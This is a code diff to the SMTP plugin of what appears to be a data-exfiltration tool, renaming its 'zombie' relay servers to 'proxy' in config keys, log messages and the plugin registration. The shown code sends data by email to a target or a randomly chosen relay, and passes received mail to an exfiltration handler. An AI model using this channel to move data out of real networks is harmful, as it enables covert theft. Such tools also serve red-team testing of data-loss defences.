@@ -25,8 +25,8 @@ class CustomSMTPServer(smtpd.SMTPServer):
             pass
 
 def send(data):
-    if config.has_key('zombies') and config['zombies'] != [""]:
-        targets = [config['target']] + config['zombies']
+    if config.has_key('proxies') and config['proxies'] != [""]:
+        targets = [config['target']] + config['proxies']
         target = choice(targets)
     else:
         target = config['target']
@@ -54,7 +54,7 @@ def relay_email(data):
     msg['Subject'] = subject
     server = smtplib.SMTP(target, port)
     try:
-        app_exfiltrate.log_message('info', "[zombie] [smtp] Relaying email to {}".format(target))
+        app_exfiltrate.log_message('info', "[proxy] [smtp] Relaying email to {}".format(target))
         server.sendmail(author, [recipient], msg.as_string())
     except:
         pass
@@ -68,9 +68,9 @@ def listen():
     server.handler = app_exfiltrate.retrieve_data
     asyncore.loop()
 
-def zombie():
+def proxy():
     port = config['port']
-    app_exfiltrate.log_message('info', "[zombie] [smtp] Starting SMTP server on port {}".format(port))
+    app_exfiltrate.log_message('info', "[proxy] [smtp] Starting SMTP server on port {}".format(port))
     server = CustomSMTPServer(('', port), None)
     server.handler = relay_email
     asyncore.loop()
@@ -81,4 +81,4 @@ class Plugin:
         global app_exfiltrate, config
         config = conf
         app_exfiltrate = app
-        app.register_plugin('smtp', {'send': send, 'listen': listen, 'zombie': zombie})
+        app.register_plugin('smtp', {'send': send, 'listen': listen, 'proxy': proxy})
